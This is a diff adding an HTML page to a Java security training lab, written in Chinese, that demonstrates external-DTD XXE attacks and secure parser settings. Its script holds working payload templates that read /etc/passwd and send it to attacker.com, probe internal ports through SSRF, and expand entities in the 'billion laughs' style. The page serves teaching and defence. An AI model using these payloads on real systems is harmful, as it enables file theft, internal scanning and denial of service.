@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>外部DTD攻击演示 - Java Security Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .code-block { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: 'Courier New', monospace; }
+        .vulnerable { border-left: 4px solid #dc3545; }
+        .safe { border-left: 4px solid #28a745; }
+        .result-box { min-height: 100px; max-height: 400px; overflow-y: auto; }
+        .dtd-item { cursor: pointer; transition: background-color 0.2s; }
+        .dtd-item:hover { background-color: #f8f9fa; }
+        .xml-input { font-family: 'Courier New', monospace; }
+        .dtd-content { background-color: #2d3748; color: #e2e8f0; font-family: 'Courier New', monospace; }
+        .attack-flow { border: 2px dashed #dee2e6; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">Java Security Lab</a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="/xxe">XXE首页</a>
+                <a class="nav-link" href="/">返回首页</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row">
+            <div class="col-12">
+                <h2><i class="fas fa-external-link-alt text-warning"></i> 外部DTD攻击演示</h2>
+                <p class="lead">演示通过外部DTD文件进行XXE攻击的高级技术和参数实体利用</p>
+            </div>
+        </div>
+
+        <!-- 外部DTD攻击原理 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h4><i class="fas fa-info-circle"></i> 外部DTD攻击原理</h4>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>攻击流程：</h6>
+                                <ol>
+                                    <li>构造引用外部DTD文件的XML</li>
+                                    <li>XML解析器请求外部DTD文件</li>
+                                    <li>外部DTD包含恶意参数实体定义</li>
+                                    <li>参数实体被解析执行恶意操作</li>
+                                    <li>通过外部回调获取敏感数据</li>
+                                </ol>
+                                
+                                <h6>关键技术：</h6>
+                                <ul>
+                                    <li><strong>参数实体：</strong> %entity; 形式的实体</li>
+                                    <li><strong>外部DTD：</strong> 远程托管的DTD文件</li>
+                                    <li><strong>数据外带：</strong> 通过HTTP请求传输数据</li>
+                                    <li><strong>盲注技术：</strong> 无直接响应的攻击确认</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>攻击流程图：</h6>
+                                <div class="attack-flow p-3 mb-3">
+                                    <div class="text-center">
+                                        <div class="mb-2">
+                                            <i class="fas fa-file-code fa-2x text-primary"></i><br>
+                                            <small>1. 恶意XML</small>
+                                        </div>
+                                        <div class="mb-2">↓</div>
+                                        <div class="mb-2">
+                                            <i class="fas fa-download fa-2x text-warning"></i><br>
+                                            <small>2. 请求外部DTD</small>
+                                        </div>
+                                        <div class="mb-2">↓</div>
+                                        <div class="mb-2">
+                                            <i class="fas fa-cogs fa-2x text-danger"></i><br>
+                                            <small>3. 执行参数实体</small>
+                                        </div>
+                                        <div class="mb-2">↓</div>
+                                        <div>
+                                            <i class="fas fa-share-square fa-2x text-success"></i><br>
+                                            <small>4. 数据外带</small>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="alert alert-warning">
+                                    <small><i class="fas fa-exclamation-triangle"></i> 
+                                    外部DTD攻击可以绕过某些XXE防护措施，是更高级的攻击技术</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 外部DTD攻击演示 -->
+        <div class="row mb-4">
+            <div class="col-md-6">
+                <div class="card vulnerable">
+                    <div class="card-header bg-warning text-dark">
+                        <h5><i class="fas fa-external-link-alt"></i> 外部DTD攻击</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="dtdAttackForm">
+                            <div class="mb-3">
+                                <label for="dtdUrl" class="form-label">外部DTD URL：</label>
+                                <input type="text" class="form-control" id="dtdUrl" value="http://attacker.com/evil.dtd" placeholder="输入外部DTD文件URL">
+                            </div>
+                            <div class="mb-3">
+                                <label for="callbackUrl" class="form-label">回调URL（数据外带）：</label>
+                                <input type="text" class="form-control" id="callbackUrl" value="http://attacker.com/callback" placeholder="输入回调URL">
+                            </div>
+                            <div class="mb-3">
+                                <label for="dtdXml" class="form-label">XXE载荷：</label>
+                                <textarea class="form-control xml-input" id="dtdXml" rows="6" readonly></textarea>
+                            </div>
+                            <button type="submit" class="btn btn-warning">
+                                <i class="fas fa-bug"></i> 执行外部DTD攻击
+                            </button>
+                            <button type="button" class="btn btn-outline-secondary ms-2" onclick="generateDtdPayload()">
+                                <i class="fas fa-sync-alt"></i> 生成载荷
+                            </button>
+                        </form>
+                        
+                        <div class="mt-3">
+                            <h6>攻击结果：</h6>
+                            <div id="dtdResult" class="border p-3 result-box bg-light">
+                                <em class="text-muted">等待攻击执行...</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header bg-info text-white">
+                        <h5><i class="fas fa-file-alt"></i> DTD文件内容</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="mb-3">
+                            <label for="dtdContent" class="form-label">恶意DTD文件内容：</label>
+                            <textarea class="form-control dtd-content" id="dtdContent" rows="10" style="color: #e2e8f0; background-color: #2d3748;"></textarea>
+                        </div>
+                        <button class="btn btn-info" onclick="generateDtdFile()">
+                            <i class="fas fa-code"></i> 生成DTD文件
+                        </button>
+                        <button class="btn btn-outline-secondary ms-2" onclick="previewDtd()">
+                            <i class="fas fa-eye"></i> 预览效果
+                        </button>
+                        
+                        <div class="mt-3">
+                            <h6>DTD说明：</h6>
+                            <div id="dtdExplanation" class="border p-3 bg-light">
+                                <em class="text-muted">生成DTD文件后显示说明...</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 参数实体攻击演示 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-percent"></i> 参数实体攻击演示</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>参数实体载荷：</h6>
+                                <form id="paramEntityForm">
+                                    <div class="mb-3">
+                                        <label for="targetFile" class="form-label">目标文件：</label>
+                                        <input type="text" class="form-control" id="targetFile" value="/etc/passwd">
+                                    </div>
+                                    <div class="mb-3">
+                                        <label for="paramXml" class="form-label">参数实体XML：</label>
+                                        <textarea class="form-control xml-input" id="paramXml" rows="8" readonly></textarea>
+                                    </div>
+                                    <button type="submit" class="btn btn-danger">
+                                        <i class="fas fa-percent"></i> 执行参数实体攻击
+                                    </button>
+                                    <button type="button" class="btn btn-outline-secondary ms-2" onclick="generateParamPayload()">
+                                        <i class="fas fa-sync-alt"></i> 生成载荷
+                                    </button>
+                                </form>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>攻击结果：</h6>
+                                <div id="paramResult" class="border p-3 result-box bg-light">
+                                    <em class="text-muted">等待参数实体攻击...</em>
+                                </div>
+                                
+                                <div class="mt-3">
+                                    <h6>网络请求监控：</h6>
+                                    <div id="networkMonitor" class="border p-3 bg-warning bg-opacity-10">
+                                        <em class="text-muted">监控外部网络请求...</em>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 常见DTD攻击模板 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-templates"></i> 常见DTD攻击模板</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-4">
+                                <h6>文件读取DTD：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('file-read')">
+                                        <strong>基础文件读取</strong><br>
+                                        <small class="text-muted">读取服务器本地文件</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('file-exfiltration')">
+                                        <strong>文件数据外带</strong><br>
+                                        <small class="text-muted">通过HTTP传输文件内容</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('blind-file')">
+                                        <strong>盲注文件读取</strong><br>
+                                        <small class="text-muted">无回显的文件读取确认</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <h6>网络攻击DTD：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('ssrf')">
+                                        <strong>SSRF攻击</strong><br>
+                                        <small class="text-muted">内网服务扫描</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('port-scan')">
+                                        <strong>端口扫描</strong><br>
+                                        <small class="text-muted">探测开放端口</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('dns-exfiltration')">
+                                        <strong>DNS数据外带</strong><br>
+                                        <small class="text-muted">通过DNS传输数据</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <h6>高级攻击DTD：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('recursive')">
+                                        <strong>递归实体攻击</strong><br>
+                                        <small class="text-muted">消耗服务器资源</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('billion-laughs')">
+                                        <strong>十亿笑声攻击</strong><br>
+                                        <small class="text-muted">指数级内存消耗</small>
+                                    </div>
+                                    <div class="list-group-item dtd-item" onclick="useDtdTemplate('quadratic')">
+                                        <strong>二次爆炸攻击</strong><br>
+                                        <small class="text-muted">二次方复杂度攻击</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 代码对比 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-code"></i> 外部DTD防护代码对比</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6 class="text-danger"><i class="fas fa-times"></i> 存在外部DTD漏洞：</h6>
+                                <div class="code-block p-3">
+                                    <pre><code>// 不安全的XML解析配置
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+// 允许加载外部DTD
+factory.setValidating(true);
+
+// 未禁用外部实体处理
+DocumentBuilder builder = factory.newDocumentBuilder();
+
+// 可能加载恶意外部DTD
+Document doc = builder.parse(
+    new InputSource(new StringReader(xmlContent)));
+
+// 外部DTD中的参数实体被执行
+return extractContent(doc);</code></pre>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <h6 class="text-success"><i class="fas fa-check"></i> 安全的外部DTD防护：</h6>
+                                <div class="code-block p-3">
+                                    <pre><code>// 安全的XML解析配置
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+// 禁用DTD处理
+factory.setFeature(
+    "http://apache.org/xml/features/disallow-doctype-decl", 
+    true);
+
+// 禁用外部通用实体
+factory.setFeature(
+    "http://xml.org/sax/features/external-general-entities", 
+    false);
+
+// 禁用外部参数实体
+factory.setFeature(
+    "http://xml.org/sax/features/external-parameter-entities", 
+    false);
+
+// 禁用外部DTD加载
+factory.setFeature(
+    "http://apache.org/xml/features/nonvalidating/load-external-dtd", 
+    false);
+
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(
+    new InputSource(new StringReader(xmlContent)));</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 防护建议 -->
+        <div class="alert alert-success">
+            <h5><i class="fas fa-shield-alt"></i> 外部DTD攻击防护建议</h5>
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>XML解析器配置：</h6>
+                    <ul>
+                        <li>禁用DOCTYPE声明处理</li>
+                        <li>禁用外部DTD加载</li>
+                        <li>禁用外部参数实体</li>
+                        <li>禁用外部通用实体</li>
+                        <li>使用安全的XML解析库</li>
+                    </ul>
+                </div>
+                <div class="col-md-6">
+                    <h6>网络层面防护：</h6>
+                    <ul>
+                        <li>限制应用程序外部网络访问</li>
+                        <li>使用防火墙阻止恶意请求</li>
+                        <li>监控异常的外部DNS查询</li>
+                        <li>实施网络访问白名单</li>
+                        <li>记录和分析网络请求日志</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // 页面加载时生成初始载荷
+        document.addEventListener('DOMContentLoaded', function() {
+            generateDtdPayload();
+            generateParamPayload();
+            generateDtdFile();
+        });
+        
+        // 生成外部DTD载荷
+        function generateDtdPayload() {
+            const dtdUrl = document.getElementById('dtdUrl').value;
+            const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "${dtdUrl}">
+<root>
+  <data>External DTD Attack</data>
+</root>`;
+            
+            document.getElementById('dtdXml').value = xmlPayload;
+        }
+        
+        // 生成参数实体载荷
+        function generateParamPayload() {
+            const targetFile = document.getElementById('targetFile').value;
+            const callbackUrl = document.getElementById('callbackUrl').value;
+            const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file://${targetFile}">
+  <!ENTITY % dtd SYSTEM "${callbackUrl}/evil.dtd">
+  %dtd;
+]>
+<root>
+  <data>Parameter Entity Attack</data>
+</root>`;
+            
+            document.getElementById('paramXml').value = xmlPayload;
+        }
+        
+        // 生成DTD文件内容
+        function generateDtdFile() {
+            const callbackUrl = document.getElementById('callbackUrl').value;
+            const dtdContent = `<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '${callbackUrl}/?data=%file;'>">
+%eval;
+%exfiltrate;`;
+            
+            document.getElementById('dtdContent').value = dtdContent;
+            
+            document.getElementById('dtdExplanation').innerHTML = `
+                <h6>DTD文件说明：</h6>
+                <ul>
+                    <li><strong>%file:</strong> 参数实体，读取/etc/passwd文件</li>
+                    <li><strong>%eval:</strong> 动态定义%exfiltrate实体</li>
+                    <li><strong>%exfiltrate:</strong> 将文件内容发送到回调URL</li>
+                </ul>
+                <p><strong>执行流程：</strong> XML解析器加载DTD → 定义参数实体 → 读取文件 → 发送HTTP请求外带数据</p>
+            `;
+        }
+        
+        // URL变化时重新生成载荷
+        document.getElementById('dtdUrl').addEventListener('input', generateDtdPayload);
+        document.getElementById('callbackUrl').addEventListener('input', function() {
+            generateDtdPayload();
+            generateParamPayload();
+            generateDtdFile();
+        });
+        document.getElementById('targetFile').addEventListener('input', generateParamPayload);
+        
+        // 外部DTD攻击表单提交
+        document.getElementById('dtdAttackForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xmlContent = document.getElementById('dtdXml').value;
+            const dtdUrl = document.getElementById('dtdUrl').value;
+            
+            document.getElementById('dtdResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 执行外部DTD攻击中...';
+            
+            fetch('/xxe/attack/dtd', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    xmlContent: xmlContent,
+                    dtdUrl: dtdUrl
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('dtdResult');
+                if (data.success) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-warning">
+                            <h6><i class="fas fa-exclamation-triangle"></i> 外部DTD攻击执行</h6>
+                            <p><strong>DTD URL:</strong> ${data.dtdUrl}</p>
+                            <p><strong>请求状态:</strong> ${data.requestStatus}</p>
+                            <p><strong>响应信息:</strong></p>
+                            <pre class="mb-0">${data.response || '无响应内容'}</pre>
+                        </div>
+                        <small class="text-muted">
+                            攻击时间: ${data.attackTime}ms | 
+                            网络请求: ${data.networkRequests} | 
+                            DTD加载: ${data.dtdLoaded ? '成功' : '失败'}
+                        </small>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-info">
+                            <h6><i class="fas fa-shield-alt"></i> 攻击被阻止</h6>
+                            <p><strong>阻止原因:</strong> ${data.error}</p>
+                            <p><strong>安全措施:</strong> ${data.protection}</p>
+                        </div>
+                    `;
+                }
+            })
+            .catch(error => {
+                document.getElementById('dtdResult').innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times"></i> 请求失败</h6>
+                        <p>错误: ${error}</p>
+                    </div>
+                `;
+            });
+        });
+        
+        // 参数实体攻击表单提交
+        document.getElementById('paramEntityForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xmlContent = document.getElementById('paramXml').value;
+            const targetFile = document.getElementById('targetFile').value;
+            
+            document.getElementById('paramResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 执行参数实体攻击中...';
+            document.getElementById('networkMonitor').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 监控网络请求...';
+            
+            fetch('/xxe/attack/param', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ 
+                    xmlContent: xmlContent,
+                    targetFile: targetFile
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('paramResult');
+                if (data.success) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-danger">
+                            <h6><i class="fas fa-percent"></i> 参数实体攻击成功</h6>
+                            <p><strong>目标文件:</strong> ${data.targetFile}</p>
+                            <p><strong>实体执行:</strong> ${data.entityExecution}</p>
+                            <p><strong>攻击结果:</strong></p>
+                            <pre class="mb-0">${data.result || '无直接返回'}</pre>
+                        </div>
+                    `;
+                    
+                    // 显示网络监控结果
+                    if (data.networkActivity) {
+                        document.getElementById('networkMonitor').innerHTML = `
+                            <h6 class="text-warning">检测到网络活动:</h6>
+                            <ul>
+                                ${data.networkActivity.map(activity => 
+                                    `<li><strong>${activity.type}:</strong> ${activity.target} (${activity.status})</li>`
+                                ).join('')}
+                            </ul>
+                        `;
+                    }
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-info">
+                            <h6><i class="fas fa-shield-alt"></i> 攻击被防护</h6>
+                            <p><strong>防护措施:</strong> ${data.error}</p>
+                        </div>
+                    `;
+                    
+                    document.getElementById('networkMonitor').innerHTML = '<em class="text-success">未检测到异常网络活动</em>';
+                }
+            })
+            .catch(error => {
+                document.getElementById('paramResult').innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times"></i> 请求失败</h6>
+                        <p>错误: ${error}</p>
+                    </div>
+                `;
+            });
+        });
+        
+        // 使用DTD模板
+        function useDtdTemplate(type) {
+            let dtdContent = '';
+            let xmlContent = '';
+            let explanation = '';
+            
+            switch(type) {
+                case 'file-read':
+                    dtdContent = `<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;`;
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/file-read.dtd">
+<root></root>`;
+                    explanation = '通过错误信息泄露文件内容的DTD模板';
+                    break;
+                    
+                case 'file-exfiltration':
+                    dtdContent = `<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/steal?data=%file;'>">
+%eval;
+%exfiltrate;`;
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/exfiltrate.dtd">
+<root></root>`;
+                    explanation = '通过HTTP请求外带文件内容的DTD模板';
+                    break;
+                    
+                case 'ssrf':
+                    dtdContent = `<!ENTITY % ssrf SYSTEM "http://127.0.0.1:22">
+<!ENTITY % eval "<!ENTITY &#x25; callback SYSTEM 'http://attacker.com/ssrf?result=%ssrf;'>">
+%eval;
+%callback;`;
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/ssrf.dtd">
+<root></root>`;
+                    explanation = '通过DTD进行SSRF攻击的模板';
+                    break;
+                    
+                case 'billion-laughs':
+                    dtdContent = `<!ENTITY lol "lol">
+<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">`;
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/billion-laughs.dtd">
+<root>&lol5;</root>`;
+                    explanation = '十亿笑声攻击，通过实体递归消耗内存';
+                    break;
+                    
+                default:
+                    dtdContent = `<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;`;
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
+<root></root>`;
+                    explanation = '基础外部DTD攻击模板';
+            }
+            
+            document.getElementById('dtdContent').value = dtdContent;
+            document.getElementById('dtdXml').value = xmlContent;
+            document.getElementById('dtdExplanation').innerHTML = `
+                <h6>模板说明：</h6>
+                <p>${explanation}</p>
+                <p><strong>攻击类型：</strong> ${type}</p>
+            `;
+        }
+        
+        // 预览DTD效果
+        function previewDtd() {
+            const dtdContent = document.getElementById('dtdContent').value;
+            
+            if (!dtdContent.trim()) {
+                alert('请先生成或输入DTD内容');
+                return;
+            }
+            
+            fetch('/xxe/dtd/preview', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ dtdContent: dtdContent })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    const modal = document.createElement('div');
+                    modal.innerHTML = `
+                        <div class="modal fade" id="dtdPreviewModal" tabindex="-1">
+                            <div class="modal-dialog modal-lg">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title">DTD预览效果</h5>
+                                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                                    </div>
+                                    <div class="modal-body">
+                                        <h6>实体定义分析：</h6>
+                                        <ul>
+                                            ${data.entities.map(entity => 
+                                                `<li><strong>${entity.name}:</strong> ${entity.type} - ${entity.description}</li>`
+                                            ).join('')}
+                                        </ul>
+                                        <h6>潜在风险：</h6>
+                                        <div class="alert alert-${data.riskLevel === 'high' ? 'danger' : data.riskLevel === 'medium' ? 'warning' : 'info'}">
+                                            ${data.risks.join('<br>')}
+                                        </div>
+                                        <h6>执行流程：</h6>
+                                        <ol>
+                                            ${data.executionFlow.map(step => `<li>${step}</li>`).join('')}
+                                        </ol>
+                                    </div>
+                                    <div class="modal-footer">
+                                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">关闭</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    document.body.appendChild(modal);
+                    const modalInstance = new bootstrap.Modal(document.getElementById('dtdPreviewModal'));
+                    modalInstance.show();
+                    
+                    // 模态框关闭后移除元素
+                    document.getElementById('dtdPreviewModal').addEventListener('hidden.bs.modal', function() {
+                        document.body.removeChild(modal);
+                    });
+                } else {
+                    alert('DTD预览失败: ' + data.error);
+                }
+            })
+            .catch(error => {
+                alert('DTD预览请求失败: ' + error);
+            });
+        }
+    </script>
+</body>
+</html>
